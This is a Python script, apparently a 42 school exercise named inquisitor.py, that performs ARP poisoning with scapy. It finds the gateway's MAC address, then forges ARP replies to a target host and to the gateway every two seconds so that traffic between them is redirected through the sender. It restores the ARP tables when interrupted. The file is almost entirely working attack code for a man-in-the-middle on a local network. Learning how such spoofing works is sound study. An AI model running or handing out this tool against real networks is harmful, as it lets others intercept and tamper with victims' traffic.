#!/usr/bin/python3

# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    inquisitor.py                                      :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: sleleu <sleleu@student.42.fr>              +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2023/09/25 14:22:24 by sleleu            #+#    #+#              #
#    Updated: 2023/09/25 14:23:13 by sleleu           ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

from scapy.all import ARP, Ether, sendp, sniff, srp, Padding
import argparse
import sys
import time

ARP_TYPE = 0x0806
WHO_HAS = 1
IS_AT = 2
IP_SRC = ""
MAC_SRC = ""
IP_TARGET = ""
MAC_TARGET = ""
MAC_GATEWAY = ""

# >>> ls(Ether)
# dst        : DestMACField         = (None)
# src        : SourceMACField       = (None)
# type       : XShortEnumField      = (0)
# >>> ls(ARP)
# hwtype     : XShortField          = (1)
# ptype      : XShortEnumField      = (2048)
# hwlen      : ByteField            = (6)
# plen       : ByteField            = (4)
# op         : ShortEnumField       = (1)
# hwsrc      : ARPSourceMACField    = (None)
# psrc       : SourceIPField        = (None)
# hwdst      : MACField             = ('00:00:00:00:00:00')
# pdst       : IPField              = ('0.0.0.0')

def parse_arguments():
	parser = argparse.ArgumentParser(description="inquisitor can perform an ARP poisoning")
	parser.add_argument("IP_src", metavar="<IP-src>", help="Define the sender IP address")
	parser.add_argument("MAC_src", metavar="<MAC-src>", help="Define the sender MAC address")
	parser.add_argument("IP_target", metavar="<IP-target>", help="Define the target IP address")
	parser.add_argument("MAC_target", metavar="<MAC-target>",help="Define the target MAC address")
	return parser.parse_args()

def create_arppkt(hwsrc:str, psrc:str, hwdst:str, pdst:str):
	trame = Ether()
	trame.type = ARP_TYPE

	packet = ARP()
	packet.hwlen = 6
	packet.plen = 4
	packet.op = IS_AT
	try:
		packet.hwsrc = hwsrc
		packet.psrc = psrc
		packet.hwdst = hwdst
		packet.pdst = pdst
	except OSError as error:
		print(f"inquisitor.py: error: {error}")
		exit(1)
	arppckt = trame / packet
	return arppckt

def find_gateway_macaddr():
	broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst="192.168.1.1")
	print("Send this request to get gateway MAC address")
	# broadcast.show()
	try:
		response = srp(broadcast, timeout=2)
	except:
		print("inquisitor.py: error: cannot get mac address of gateway")
		exit(1)
	return response[0][0][1].hwsrc

def inquisitor():
	print(f"{MAC_SRC} | {IP_TARGET} | {MAC_GATEWAY} | {MAC_SRC}")
	target_packet = create_arppkt(MAC_SRC, IP_SRC, MAC_TARGET, IP_TARGET)
	gateway_packet = create_arppkt(MAC_SRC, IP_TARGET, MAC_GATEWAY, IP_SRC)
	try:
		while True:
			sendp(target_packet, verbose=False)
			sendp(gateway_packet, verbose=False)
			time.sleep(2)
	except KeyboardInterrupt :
		print("\nEnd of arp poisonning")
		target_restore_packet = create_arppkt(MAC_GATEWAY, IP_SRC, MAC_TARGET, IP_TARGET)
		gateway_restore_packet = create_arppkt(MAC_TARGET, IP_TARGET, MAC_GATEWAY, IP_SRC)
		sendp(target_restore_packet, verbose=False)
		sendp(gateway_restore_packet, verbose=False)
		exit(0)

if __name__ == "__main__":
	args = parse_arguments()
	if len(sys.argv) != 5:
		exit(1)
	IP_SRC = args.IP_src
	MAC_SRC = args.MAC_src
	IP_TARGET = args.IP_target
	MAC_TARGET = args.MAC_target
	MAC_GATEWAY = find_gateway_macaddr()
	inquisitor()